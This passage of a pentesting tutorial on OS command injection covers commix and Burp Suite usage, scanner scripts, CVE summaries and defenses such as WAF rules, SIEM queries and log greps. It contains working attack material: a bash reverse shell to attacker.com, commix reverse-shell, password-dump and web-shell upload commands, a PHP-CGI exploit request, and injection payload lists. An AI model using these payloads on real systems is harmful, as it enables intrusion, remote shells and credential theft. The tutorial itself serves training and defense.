commix --url="http://target.com/page" --cookie="PHPSESSID=abc123"

# Use proxy (Burp)
commix --url="http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"

# Specify technique
commix --url="http://target.com/page?id=1" --technique=t  # time-based
commix --url="http://target.com/page?id=1" --technique=f  # file-based
```

**Advanced options:**
```bash
# OS command execution
commix --url="http://target.com/page?id=1" --os-cmd="whoami"

# File read
commix --url="http://target.com/page?id=1" --file-read="/etc/passwd"

# Reverse shell
commix --url="http://target.com/page?id=1" --reverse-tcp="attacker.com:4444"

# Full enumeration
commix --url="http://target.com/page?id=1" --all
```

#### Using Custom Scripts

**Python detection script:**

```python
#!/usr/bin/env python3
import requests
import time

def test_command_injection(url, param):
    """Test for time-based command injection"""
    payloads = [
        "||sleep 5||",
        ";sleep 5;",
        "|sleep 5|",
        "`sleep 5`",
        "$(sleep 5)"
    ]

    for payload in payloads:
        start = time.time()
        data = {param: f"test{payload}"}

        try:
            response = requests.post(url, data=data, timeout=10)
            elapsed = time.time() - start

            if elapsed >= 5:
                print(f"[+] Vulnerable! Payload: {payload}")
                print(f"    Response time: {elapsed:.2f}s")
                return True
        except requests.Timeout:
            print(f"[+] Potential vulnerability (timeout): {payload}")

    print("[-] No command injection detected")
    return False

# Usage
test_command_injection("http://target.com/submit", "email")
```

**Bash detection script:**

```bash
#!/bin/bash

URL="http://target.com/submit"
PARAM="email"

echo "[*] Testing for OS Command Injection..."

# Test time-based
for sep in "||" ";" "|" "&" "&&"; do
    payload="test${sep}sleep 5${sep}"
    start=$(date +%s)

    curl -s "$URL" -d "${PARAM}=${payload}" >/dev/null

    end=$(date +%s)
    elapsed=$((end - start))

    if [ $elapsed -ge 5 ]; then
        echo "[+] Vulnerable with separator: ${sep}"
        echo "    Payload: ${payload}"
        echo "    Response time: ${elapsed}s"
        exit 0
    fi
done

echo "[-] No command injection detected"
```

### Confirming Vulnerabilities

**Multi-stage confirmation:**

1. **Initial detection**: Time-based delay (5-10 seconds)
2. **Secondary confirmation**: Different delay (15 seconds)
3. **Out-of-band verification**: DNS/HTTP callback
4. **Output extraction**: Read file or execute `whoami`

**Reducing false positives:**

- Test multiple payloads and techniques
- Verify consistent behavior across requests
- Use unique identifiers in payloads
- Combine multiple detection methods
- Test with known safe input as control

---

## Burp Suite Workflows

### Proxy Workflow

**Step 1: Configure browser proxy**
- Set browser to use `127.0.0.1:8080`
- Ensure **Intercept is on**

**Step 2: Intercept vulnerable request**
- Interact with target application
- Identify request with user-controlled parameters

**Step 3: Send to Repeater**
- Right-click request → **Send to Repeater**
- Or use keyboard shortcut: `Ctrl+R`

### Repeater Workflow

**Testing command injection systematically:**

**Tab 1: Time-based detection**
```http
POST /feedback HTTP/1.1
Host: target.com

email=test||sleep+5||&message=test
```
- Send request
- Observe response time (bottom right)
- Look for ~5 second delay

**Tab 2: Output reflection**
```http
POST /feedback HTTP/1.1
Host: target.com

email=test|whoami&message=test
```
- Send request
- Search response for command output
- Use **Search** function: `Ctrl+F`

**Tab 3: Out-of-band**
```http
POST /feedback HTTP/1.1
Host: target.com

email=test||nslookup+burpcollaborator.net||&message=test
```
- Right-click value → **Insert Collaborator payload**
- Send request
- Check Collaborator tab for interactions

### Intruder Workflow

**Attack type: Sniper** (single injection point)

**Position tab:**
```http
POST /feedback HTTP/1.1
Host: target.com

email=test§||sleep 5||§&message=test
```

**Payloads tab:**
```
||sleep 5||
;sleep 5;
|sleep 5|
`sleep 5`
$(sleep 5)
||ping -c 5 127.0.0.1||
||timeout 5||
& sleep 5 &
```

**Options tab:**
- **Grep - Match**: Add pattern `peter|root|admin`
- **Grep - Extract**: Add pattern to extract specific data
- **Request Engine**: Threads = 1 (for time-based testing)

**Results analysis:**
- Sort by **Response received** time
- Look for consistent delays
- Check **Grep - Match** columns for output

### Collaborator Workflow

**Setup:**
1. Open **Burp menu** → **Burp Collaborator client**
2. Click **"Copy to clipboard"**
3. Paste subdomain in payloads

**Testing process:**
1. Inject payload with Collaborator domain
2. Send request
3. Wait 5-10 seconds (for async execution)
4. Click **"Poll now"** in Collaborator client
5. Review interactions in results table

**Interaction types to look for:**
- **DNS queries**: Indicates command execution
- **HTTP requests**: Successful out-of-band connection
- **HTTPS requests**: Encrypted channel available

**Data exfiltration analysis:**
```
DNS Query received:
  peter-xyz123.abc.burpcollaborator.net

HTTP Request received:
  GET /c3VwZXJzZWNyZXQ= HTTP/1.1

Base64 decode: supersecret
```

### Scanner Workflow

**Passive scanning:**
- Automatically runs on all proxied traffic
- Identifies potential injection points
- Low false positive rate

**Active scanning:**
1. Right-click target → **Scan**
2. Configure scan:
   - Enable **OS command injection** checks
   - Set insertion points: Parameters, Headers, Cookies
   - Configure attack optimization
3. Review results in **Dashboard**

**Custom scan insertions:**
```
POST /api/submit HTTP/1.1
Host: target.com

{
  "email": "test§§",
  "message": "test§§"
}
```

Add `§§` markers for custom insertion points.

### Extensions for OS Command Injection

**Recommended Burp extensions:**

1. **Command Injection Attacker**
   - Automated payload generation
   - Multiple technique support
   - Custom wordlist integration

2. **Commix Integration**
   - Right-click menu integration
   - Automated exploitation
   - Session handling

3. **Turbo Intruder**
   - High-speed testing
   - Python scripting for custom attacks
   - Time-based detection automation

4. **Logger++**
   - Advanced logging
   - Grep functionality
   - Response time tracking

**Installing extensions:**
1. Navigate to **Extender** → **BApp Store**
2. Search for extension name
3. Click **Install**

---

## Tools and Automation

### Commix - Command Injection Exploiter

**Official repository:** https://github.com/commixproject/commix

**Installation:**
```bash
# Kali Linux (pre-installed)
commix --help

# From source
git clone https://github.com/commixproject/commix.git
cd commix
python commix.py --help
```

**Basic usage:**

```bash
# GET parameter testing
commix --url="http://target.com/page?id=1"

# POST parameter testing
commix --url="http://target.com/submit" \
       --data="email=test&message=test" \
       -p email

# Cookie-based injection
commix --url="http://target.com/page" \
       --cookie="sessionid=abc123;tracking=xyz"

# Custom HTTP headers
commix --url="http://target.com/page" \
       --header="X-Forwarded-For: 127.0.0.1" \
       -p X-Forwarded-For
```

**Exploitation techniques:**

```bash
# Time-based detection
commix --url="http://target.com/page?id=1" \
       --technique=t

# File-based detection
commix --url="http://target.com/page?id=1" \
       --technique=f \
       --web-root="/var/www/html"

# Temp-based detection
commix --url="http://target.com/page?id=1" \
       --technique=e

# All techniques
commix --url="http://target.com/page?id=1" \
       --technique=tfe
```

**Command execution:**

```bash
# Execute single command
commix --url="http://target.com/page?id=1" \
       --os-cmd="whoami"

# Interactive shell
commix --url="http://target.com/page?id=1" \
       --os-shell

# Pseudo-terminal shell
commix --url="http://target.com/page?id=1" \
       --os-shell \
       --pseudo-terminal
```

**File operations:**

```bash
# Read file
commix --url="http://target.com/page?id=1" \
       --file-read="/etc/passwd"

# Write file
commix --url="http://target.com/page?id=1" \
       --file-write="/tmp/payload.sh" \
       --file-dest="/var/www/html/shell.php"

# Upload file
commix --url="http://target.com/page?id=1" \
       --file-upload="/tmp/shell.php" \
       --file-dest="/var/www/html/shell.php"
```

**Enumeration:**

```bash
# Current user
commix --url="http://target.com/page?id=1" \
       --current-user

# Hostname
commix --url="http://target.com/page?id=1" \
       --hostname

# Check if user is privileged
commix --url="http://target.com/page?id=1" \
       --is-root

# System passwords
commix --url="http://target.com/page?id=1" \
       --passwords

# Full enumeration
commix --url="http://target.com/page?id=1" \
       --all
```

**Advanced options:**

```bash
# Use proxy (Burp Suite)
commix --url="http://target.com/page?id=1" \
       --proxy="http://127.0.0.1:8080"

# Custom user agent
commix --url="http://target.com/page?id=1" \
       --user-agent="Custom UA String"

# Delay between requests
commix --url="http://target.com/page?id=1" \
       --delay=2

# Timeout
commix --url="http://target.com/page?id=1" \
       --timeout=10

# Verbosity
commix --url="http://target.com/page?id=1" \
       -v 2
```

### Manual Testing with cURL

**Basic command injection testing:**

```bash
# GET request
curl "http://target.com/page?id=1|whoami"

# POST request
curl -X POST "http://target.com/submit" \
     -d "email=test||whoami||&message=test"

# Time-based detection
time curl -X POST "http://target.com/submit" \
     -d "email=test||sleep 5||"

# With cookies
curl "http://target.com/page?id=1" \
     -b "sessionid=abc123" \
     -d "param=test||whoami||"

# Custom headers
curl "http://target.com/page" \
     -H "X-Forwarded-For: 127.0.0.1||whoami||"

# Follow redirects
curl -L "http://target.com/page?id=1||whoami||"
```

**Output analysis:**

```bash
# Save response
curl "http://target.com/page?id=1||whoami||" -o response.txt

# Show only body
curl -s "http://target.com/page?id=1||whoami||"

# Show response time
curl -w "\nTime: %{time_total}s\n" \
     "http://target.com/submit" \
     -d "email=test||sleep 5||"

# Verbose output
curl -v "http://target.com/page?id=1||whoami||"
```

### Custom Python Scripts

**Automated testing framework:**

```python
#!/usr/bin/env python3
import requests
import time
import sys
from urllib.parse import urljoin

class CommandInjectionTester:
    def __init__(self, base_url, param_name):
        self.base_url = base_url
        self.param_name = param_name
        self.session = requests.Session()

    def test_time_based(self, delay=5):
        """Test time-based blind command injection"""
        payloads = [
            f"||sleep {delay}||",
            f";sleep {delay};",
            f"|sleep {delay}|",
            f"`sleep {delay}`",
            f"$(sleep {delay})",
            f"||ping -c {delay} 127.0.0.1||",
        ]

        print(f"[*] Testing time-based injection on {self.param_name}...")

        for payload in payloads:
            data = {self.param_name: f"test{payload}"}
            start = time.time()

            try:
                response = self.session.post(
                    self.base_url,
                    data=data,
                    timeout=delay + 5
                )
                elapsed = time.time() - start

                if elapsed >= delay:
                    print(f"[+] VULNERABLE!")
                    print(f"    Payload: {payload}")
                    print(f"    Expected delay: {delay}s")
                    print(f"    Actual delay: {elapsed:.2f}s")
                    return True, payload

            except requests.Timeout:
                print(f"[!] Request timeout with payload: {payload}")

        return False, None

    def test_output_based(self):
        """Test for direct output in response"""
        payloads = [
            "|whoami",
            ";whoami",
            "||whoami||",
            "`whoami`",
            "$(whoami)",
            "&whoami&",
        ]

        print(f"[*] Testing output-based injection on {self.param_name}...")

        for payload in payloads:
            data = {self.param_name: f"test{payload}"}

            try:
                response = self.session.post(self.base_url, data=data)

                # Look for common command outputs
                indicators = ['root', 'www-data', 'apache', 'nginx', 'uid=', 'gid=']

                for indicator in indicators:
                    if indicator in response.text:
                        print(f"[+] VULNERABLE!")
                        print(f"    Payload: {payload}")
                        print(f"    Found indicator: {indicator}")
                        print(f"    Response excerpt: {response.text[:200]}")
                        return True, payload

            except Exception as e:
                print(f"[-] Error with payload {payload}: {e}")

        return False, None

    def test_oob_dns(self, collaborator_domain):
        """Test out-of-band DNS exfiltration"""
        payloads = [
            f"||nslookup {collaborator_domain}||",
            f";nslookup {collaborator_domain};",
            f"|nslookup {collaborator_domain}|",
            f"`nslookup {collaborator_domain}`",
        ]

        print(f"[*] Testing out-of-band DNS to {collaborator_domain}...")

        for payload in payloads:
            data = {self.param_name: f"test{payload}"}

            try:
                response = self.session.post(self.base_url, data=data)
                print(f"[*] Sent payload: {payload}")
                print(f"[*] Check Burp Collaborator for DNS interactions")

            except Exception as e:
                print(f"[-] Error: {e}")

        return None, None

# Usage
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <parameter>")
        print(f"Example: {sys.argv[0]} http://target.com/submit email")
        sys.exit(1)

    url = sys.argv[1]
    param = sys.argv[2]

    tester = CommandInjectionTester(url, param)

    # Test all techniques
    vuln, payload = tester.test_time_based(delay=5)
    if not vuln:
        vuln, payload = tester.test_output_based()

    if vuln:
        print(f"\n[+] Target is vulnerable to OS command injection!")
        print(f"[+] Use this payload for exploitation: {payload}")
    else:
        print(f"\n[-] No vulnerability detected")
```

**Usage:**
```bash
python3 cmd_injection_tester.py http://target.com/submit email
```

### Metasploit Integration

**Using Metasploit for post-exploitation:**

```bash
# Start Metasploit
msfconsole

# Set up listener for reverse shell
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST attacker.com
set LPORT 4444
exploit -j

# Inject reverse shell payload via command injection
# In web application:
# param=test||bash -i >& /dev/tcp/attacker.com/4444 0>&1||
```

**Command injection auxiliary modules:**

```bash
# Scan for command injection
use auxiliary/scanner/http/command_injection
set RHOSTS target.com
set TARGETURI /page?id=1
run

# Exploit module (if exists for target)
search command injection
use exploit/path/to/module
set RHOSTS target.com
exploit
```

---

## Real-World CVE Examples

### CVE-2024-3400 - Palo Alto Networks PAN-OS GlobalProtect

**Severity:** Critical (CVSS 10.0)
**Type:** Command injection via arbitrary file creation

**Description:**
A command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software allows an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.

**Vulnerable versions:**
- PAN-OS 10.2 < 10.2.9-h1
- PAN-OS 11.0 < 11.0.4-h1
- PAN-OS 11.1 < 11.1.2-h3

**Exploitation:**
The vulnerability was actively exploited in the wild. Attackers leveraged arbitrary file creation to inject commands that executed with root privileges.

**Impact:**
- Full system compromise
- Data theft from enterprise networks
- Malware installation
- Lateral movement to internal networks

**Remediation:**
- Upgrade to patched versions
- Restrict GlobalProtect gateway access
- Monitor for indicators of compromise (IOCs)

**References:**
- https://security.paloaltonetworks.com/CVE-2024-3400
- CISA KEV Catalog entry

---

### CVE-2024-8686 - Palo Alto Networks PAN-OS

**Severity:** High (CVSS 9.3)
**Type:** Authenticated administrator command injection

**Description:**
A command injection vulnerability in PAN-OS enables an authenticated administrator to bypass system restrictions and run arbitrary commands as root on the firewall.

**Vulnerable versions:**
- Multiple PAN-OS versions (check vendor advisory)

**Exploitation:**
Requires authenticated administrator access, but allows privilege escalation to root level.

**Impact:**
- Root-level system access
- Bypass of security controls
- Configuration tampering
- Potential backdoor installation

**Remediation:**
- Apply vendor patches immediately
- Audit administrator access logs
- Implement least privilege principle

**References:**
- https://security.paloaltonetworks.com/CVE-2024-8686

---

### CVE-2024-4577 - PHP CGI Command Injection

**Severity:** Critical (CVSS 9.8)
**Type:** OS command injection in PHP-CGI on Windows

**Description:**
A remote code execution vulnerability in PHP affects all versions installed on Windows when running in CGI mode. The vulnerability is trivial to exploit and has been actively exploited by threat actors.

**Vulnerable versions:**
- PHP 8.3 < 8.3.8
- PHP 8.2 < 8.2.20
- PHP 8.1 < 8.1.29
- All versions on Windows running CGI mode

**Exploitation:**
Attackers can bypass argument injection protections due to best fit character encoding issues on Windows, allowing arbitrary command execution.

**Example exploit:**
```http
GET /index.php?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
Host: target.com

<?php system('whoami'); ?>
```

**Impact:**
- Remote code execution without authentication
- Web server compromise
- Data theft
- Ransomware deployment (observed in wild)

**Remediation:**
- Upgrade PHP to patched versions
- Disable CGI mode if not required
- Use FastCGI or FPM instead
- Web Application Firewall (WAF) rules

**References:**
- https://www.keysight.com/blogs/en/tech/nwvs/2024/07/29/cve-2024-4577-php-cgi-os-command-injection-vulnerability

---

### CVE-2025-4230 - Palo Alto Networks PAN-OS CLI

**Severity:** High
**Type:** Authenticated admin command injection through CLI

**Description:**
A command injection vulnerability in PAN-OS® software enables an authenticated administrator to bypass system restrictions and run arbitrary commands as a root user via the CLI.

**Exploitation:**
Requires authenticated administrator access to the CLI interface.

**Impact:**
- Root privilege escalation
- System configuration tampering
- Potential persistence mechanisms

**Remediation:**
- Apply latest security patches
- Restrict CLI access
- Enable CLI command logging
- Monitor for suspicious administrative activity

**References:**
- https://security.paloaltonetworks.com/CVE-2025-4230

---

### CVE-2025-4231 - Palo Alto Networks PAN-OS Web Interface

**Severity:** High
**Type:** Authenticated admin command injection via web interface

**Description:**
A command injection vulnerability in PAN-OS® enables an authenticated administrative user to perform actions as the root user through the management web interface.

**Exploitation:**
Web-based exploitation vector for authenticated administrators.

**Impact:**
- Root-level command execution
- Web interface compromise
- Configuration extraction

**Remediation:**
- Patch to latest version
- Restrict web interface access
- Implement multi-factor authentication
- Network segmentation for management interfaces

**References:**
- https://security.paloaltonetworks.com/CVE-2025-4231

---

### CVE-2025-53695 - iSTAR Ultra Products

**Severity:** High
**Type:** OS command injection in web application

**Description:**
OS Command Injection in iSTAR Ultra products web application allows an authenticated attacker to gain privileged access ('root' user) to the device firmware.

**Impact:**
- IoT device compromise
- Firmware tampering
- Physical security system bypass
- Lateral movement in building management networks

**Remediation:**
- Apply firmware updates
- Network isolation for IoT devices
- Strong authentication requirements
- Regular security audits

**References:**
- https://github.com/advisories/GHSA-g6w7-rgjj-7r73

---

### FortiDDoS-F CLI - OS Command Injection (2025)

**Severity:** High (CWE-78)
**Type:** Improper neutralization of special elements in OS command

**Vendor:** Fortinet
**Product:** FortiDDoS-F

**Description:**
An improper neutralization of special elements used in an OS command vulnerability in FortiDDoS-F CLI may allow a privileged attacker to execute unauthorized code or commands via crafted CLI requests.

**Exploitation:**
Requires privileged user access to the CLI, but enables command injection through specially crafted input.

**Impact:**
- Arbitrary command execution
- DDoS protection bypass
- Network security appliance compromise
- Potential lateral movement

**Remediation:**
- Update FortiDDoS-F firmware
- Review CLI access controls
- Audit privileged user actions
- Implement command input validation

**References:**
- https://fortiguard.fortinet.com/psirt/FG-IR-24-344

---

### CISA Secure by Design Alert (2024)

**Title:** Eliminating OS Command Injection Vulnerabilities

**Key findings:**
- CISA added CVE-2024-20399, CVE-2024-3400, and CVE-2024-21887 to the KEV (Known Exploited Vulnerabilities) catalog
- All three CVEs are OS command injection vulnerabilities
- Active exploitation observed in the wild
- Demonstrates continued prevalence of this vulnerability class

**Affected vendors:**
- Palo Alto Networks
- Cisco
- Ivanti
- Multiple enterprise security appliances

**Recommendations:**
- Manufacturers must eliminate OS command injection by design
- Use parameterized APIs instead of shell execution
- Implement input validation at all trust boundaries
- Regular security testing and code reviews

**References:**
- https://www.cisa.gov/resources-tools/resources/secure-design-alert-eliminating-os-command-injection-vulnerabilities

---

## Prevention and Defense

### Secure Coding Practices

#### Primary Defense: Avoid OS Commands

**The golden rule:** Never call OS commands from application code.

**Instead of this (VULNERABLE):**
```python
# BAD: Using shell execution
import subprocess
user_input = request.POST['filename']
subprocess.call(f"cat {user_input}", shell=True)
```

**Do this (SECURE):**
```python
# GOOD: Using native APIs
import os
user_input = request.POST['filename']

# Validate input first
if not user_input.isalnum():
    raise ValueError("Invalid filename")

# Use native file operations
with open(user_input, 'r') as f:
    content = f.read()
```

#### Parameterization

When OS commands are absolutely necessary, use parameterized execution:

**Python (secure subprocess usage):**
```python
import subprocess
import shlex

# GOOD: Separate command and arguments
user_input = request.POST['filename']

# Validate input
allowed_files = ['file1.txt', 'file2.txt', 'file3.txt']
if user_input not in allowed_files:
    raise ValueError("File not allowed")

# Use list form (no shell=True)
result = subprocess.run(['cat', user_input], capture_output=True, text=True)
```

**Java (ProcessBuilder):**
```java
// GOOD: ProcessBuilder with separate arguments
String userInput = request.getParameter("filename");

// Validate input
if (!userInput.matches("[a-zA-Z0-9.]+")) {
    throw new IllegalArgumentException("Invalid filename");
}

// Use ProcessBuilder
ProcessBuilder pb = new ProcessBuilder("cat", userInput);
Process process = pb.start();
```

**Node.js (child_process):**
```javascript
const { execFile } = require('child_process');

// GOOD: Use execFile instead of exec
const userInput = req.body.filename;

// Validate input
if (!/^[a-zA-Z0-9.]+$/.test(userInput)) {
    throw new Error("Invalid filename");
}

// Use execFile with separate arguments
execFile('cat', [userInput], (error, stdout, stderr) => {
    // Handle output
});
```

**PHP (escapeshellarg):**
```php
<?php
// BETTER: Use escapeshellarg (but still not ideal)
$userInput = $_POST['filename'];

// Validate input first
if (!preg_match('/^[a-zA-Z0-9.]+$/', $userInput)) {
    die("Invalid filename");
}

// Escape the argument
$safeInput = escapeshellarg($userInput);
$output = shell_exec("cat $safeInput");
?>
```

### Input Validation

#### Allowlist Approach

**Only allow known-safe characters:**

```python
import re

def validate_input(user_input):
    """Allowlist validation for filenames"""
    # Only allow alphanumeric and specific characters
    if not re.match(r'^[a-zA-Z0-9._-]+$', user_input):
        raise ValueError("Invalid input: contains forbidden characters")

    # Additional length check
    if len(user_input) > 255:
        raise ValueError("Input too long")

    # Check against known safe values
    allowed_files = ['report.txt', 'data.csv', 'config.json']
    if user_input not in allowed_files:
        raise ValueError("File not in allowed list")

    return user_input
```

**Reject dangerous characters:**

```python
def reject_dangerous_chars(user_input):
    """Reject input containing shell metacharacters"""
    dangerous_chars = [';', '|', '&', '$', '>', '<', '`', '\\', '!', '\n', '(', ')']

    for char in dangerous_chars:
        if char in user_input:
            raise ValueError(f"Forbidden character detected: {char}")

    return user_input
```

#### Command Allowlist

**Only allow specific, pre-defined commands:**

```python
def execute_allowed_command(command_name, arguments):
    """Execute only whitelisted commands"""
    allowed_commands = {
        'list_files': ['ls', '-la'],
        'show_date': ['date'],
        'disk_usage': ['df', '-h'],
    }

    if command_name not in allowed_commands:
        raise ValueError("Command not allowed")

    # Get pre-defined command
    cmd = allowed_commands[command_name]

    # Validate and append arguments if allowed
    if arguments:
        validated_args = validate_input(arguments)
        cmd.append(validated_args)

    # Execute with subprocess (no shell)
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout
```

### Security Headers and WAF Rules

#### Web Application Firewall (WAF) Rules

**ModSecurity rules for OS command injection:**

```apache
# Detect common command injection patterns
SecRule ARGS "@rx (?:;|\||`|\$\(|\$\{)" \
    "id:1001,phase:2,deny,status:403,\
    msg:'Command injection attempt detected'"

# Detect command separators
SecRule ARGS "@rx (?:&&|\|\|)" \
    "id:1002,phase:2,deny,status:403,\
    msg:'Command chaining detected'"

# Detect common Unix commands
SecRule ARGS "@rx (?:whoami|cat|ls|pwd|id|uname)" \
    "id:1003,phase:2,deny,status:403,\
    msg:'Suspicious command detected'"

# Detect time-based payloads
SecRule ARGS "@rx (?:sleep|ping|timeout)" \
    "id:1004,phase:2,deny,status:403,\
    msg:'Time-based injection detected'"
```

**AWS WAF rule example:**

```json
{
  "Name": "CommandInjectionRule",
  "Priority": 1,
  "Statement": {
    "OrStatement": {
      "Statements": [
        {
          "ByteMatchStatement": {
            "SearchString": ";whoami",
            "FieldToMatch": {
              "AllQueryArguments": {}
            },
            "TextTransformations": [
              {
                "Priority": 0,
                "Type": "URL_DECODE"
              }
            ],
            "PositionalConstraint": "CONTAINS"
          }
        },
        {
          "RegexPatternSetReferenceStatement": {
            "Arn": "arn:aws:wafv2:region:account:regional/regexpatternset/command-injection/id",
            "FieldToMatch": {
              "Body": {}
            },
            "TextTransformations": [
              {
                "Priority": 0,
                "Type": "URL_DECODE"
              }
            ]
          }
        }
      ]
    }
  },
  "Action": {
    "Block": {}
  }
}
```

### Principle of Least Privilege

**Run application with minimal permissions:**

```bash
# Create dedicated user with restricted permissions
sudo useradd -r -s /bin/false webapp

# Set ownership
sudo chown -R webapp:webapp /var/www/app

# Remove write permissions from web root
sudo chmod -R 555 /var/www/app

# Run application as non-privileged user
sudo -u webapp /usr/bin/python3 /var/www/app/server.py
```

**Docker container security:**

```dockerfile
# Use non-root user
FROM python:3.9-slim

# Create non-root user
RUN useradd -m -u 1000 appuser

# Set working directory
WORKDIR /app

# Copy application
COPY --chown=appuser:appuser . /app

# Switch to non-root user
USER appuser

# Run application
CMD ["python", "app.py"]
```

**Kubernetes security context:**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: webapp
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
  containers:
  - name: app
    image: webapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop:
        - ALL
      readOnlyRootFilesystem: true
```

### Monitoring and Detection

#### Log Analysis

**Monitor for suspicious command patterns:**

```bash
# Apache/Nginx access logs
grep -E "(;|\\||&&|\\$\\(|`)" /var/log/apache2/access.log

# Check for common commands in logs
grep -E "(whoami|cat|ls|id|/etc/passwd)" /var/log/apache2/access.log

# Detect time-based payloads
grep -E "(sleep|ping|timeout)" /var/log/apache2/access.log

# Detect out-of-band attempts
grep -E "(nslookup|curl|wget|nc)" /var/log/apache2/access.log
```

**Application-level logging:**

```python
import logging
import re

logger = logging.getLogger(__name__)

def check_suspicious_input(user_input):
    """Log suspicious patterns in user input"""
    suspicious_patterns = [
        r'[;|&$`]',  # Shell metacharacters
        r'(whoami|cat|ls|id)',  # Common commands
        r'(sleep|ping|timeout)',  # Time-based
        r'(nslookup|curl|wget)',  # Out-of-band
    ]

    for pattern in suspicious_patterns:
        if re.search(pattern, user_input):
            logger.warning(
                f"Suspicious input detected: {user_input}",
                extra={
                    'pattern': pattern,
                    'ip_address': request.remote_addr,
                    'user_agent': request.headers.get('User-Agent'),
                }
            )
            return True

    return False
```

#### SIEM Rules

**Splunk query:**

```spl
index=web_logs
| regex _raw="(?i)(;|\\||&&|\\$\\(|`)"
| regex _raw="(?i)(whoami|cat|ls|id|/etc/passwd)"
| stats count by src_ip, uri, user_agent
| where count > 5
| sort -count
```

**Elastic SIEM rule:**

```json
{
  "rule": {
    "name": "OS Command Injection Attempt",
    "description": "Detects potential OS command injection attempts",
    "query": "http.request.body.content:(*;whoami* OR *|whoami* OR *`whoami`* OR *$(whoami)*)",
    "severity": "high",
    "risk_score": 75,
    "threat": [
      {
        "framework": "MITRE ATT&CK",
        "technique": [
          {
            "id": "T1059",
            "name": "Command and Scripting Interpreter"
          }
        ]
      }
    ]
  }
}
```

### Security Testing

**Include OS command injection in security testing:**

1. **Code Review**
   - Search for dangerous functions: `system()`, `exec()`, `shell_exec()`, `eval()`
   - Review all user input handling
   - Check for proper input validation

2. **Static Application Security Testing (SAST)**
   - Use tools like SonarQube, Checkmarx, Fortify
   - Configure rules for command injection detection
   - Integrate into CI/CD pipeline

3. **Dynamic Application Security Testing (DAST)**
   - Use tools like Burp Suite, OWASP ZAP, Acunetix
   - Configure active scanning for command injection
   - Include in pre-production testing

4. **Penetration Testing**
   - Manual testing by security professionals
   - Test all input vectors systematically
   - Verify exploitation impact

5. **Bug Bounty Programs**
   - Crowdsourced security testing
   - Incentivize vulnerability discovery
   - Responsible disclosure process

---

## References

### OWASP Resources

1. **OS Command Injection Defense Cheat Sheet**
   - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
   - Comprehensive defense strategies
   - Language-specific guidance
   - Code examples and best practices

2. **Testing for Command Injection**
   - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
   - Testing methodologies
   - Payload examples
   - Detection techniques

3. **Command Injection Attack Guide**
   - https://owasp.org/www-community/attacks/Command_Injection
   - Attack descriptions
   - Exploitation techniques
   - Prevention strategies

4. **Injection Prevention Cheat Sheet**
   - https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
   - General injection prevention
   - Multiple injection types
   - Defense in depth

### Industry Standards

1. **CISA Secure by Design Alert**
   - https://www.cisa.gov/resources-tools/resources/secure-design-alert-eliminating-os-command-injection-vulnerabilities
   - Government guidance on eliminating OS command injection
   - Recommendations for software manufacturers
   - Real-world vulnerability examples

2. **MITRE CWE-78: OS Command Injection**
   - https://cwe.mitre.org/data/definitions/78.html
   - Weakness description
   - Common consequences
   - Detection methods
   - Mitigation strategies

3. **MITRE ATT&CK: T1059 - Command and Scripting Interpreter**
   - https://attack.mitre.org/techniques/T1059/
   - Adversary tactics and techniques
   - Detection and mitigation
   - Real-world examples

4. **CAPEC-88: OS Command Injection**
   - https://capec.mitre.org/data/definitions/88.html
   - Attack pattern description
   - Execution flow
   - Prerequisites and resources

### PortSwigger Resources

1. **What is OS Command Injection?**
   - https://portswigger.net/web-security/os-command-injection
   - Vulnerability overview
   - Exploitation techniques
   - Prevention guidance

2. **OS Command Injection Labs**
   - Lab 1: https://portswigger.net/web-security/os-command-injection/lab-simple
   - Lab 2: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
   - Lab 3: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
   - Lab 4: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
   - Lab 5: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration

### CVE Databases

1. **National Vulnerability Database (NVD)**
   - https://nvd.nist.gov/
   - Search for CWE-78 (OS Command Injection)
   - CVSS scoring
   - Patch information

2. **CISA Known Exploited Vulnerabilities (KEV) Catalog**
   - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
   - Actively exploited vulnerabilities
   - Remediation deadlines for federal agencies
   - Priority patching guidance

### Tools and Frameworks

1. **Commix - Command Injection Exploiter**
   - GitHub: https://github.com/commixproject/commix
   - Official site: https://commixproject.com/
   - Documentation and usage examples
   - Pre-installed on Kali Linux

2. **Burp Suite Professional**
   - https://portswigger.net/burp
   - Web application security testing platform
   - Command injection scanning
   - Burp Collaborator for out-of-band testing

3. **OWASP ZAP**
   - https://www.zaproxy.org/
   - Free and open-source
   - Active and passive scanning
   - Command injection detection

### Research Papers and Articles

1. **"Back to Basics: OS Command Injection" - Fastly**
   - https://www.fastly.com/blog/back-to-basics-os-command-injection
   - Modern perspective on classic vulnerability
   - Real-world examples and case studies

2. **"Command Injection: How it Works, Risks, and Prevention" - Snyk**
   - https://snyk.io/blog/command-injection/
   - Developer-focused prevention guide
   - Code examples in multiple languages
   - Security testing integration

3. **"4 Essentials to Prevent OS Command Injection Attacks" - Red Hat**
   - https://developers.redhat.com/articles/2023/03/29/4-essentials-prevent-os-command-injection-attacks
   - Enterprise security perspective
   - Container and cloud considerations
   - DevSecOps integration

### Secure Coding Guidelines

1. **OWASP Secure Coding Practices**
   - https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/
   - Input validation
   - Output encoding
   - Error handling

2. **SEI CERT Coding Standards**
   - https://wiki.sei.cmu.edu/confluence/display/seccode
   - Language-specific secure coding rules
   - Command injection prevention
   - Code examples and violations

3. **CWE/SANS Top 25 Most Dangerous Software Weaknesses**
   - https://cwe.mitre.org/top25/
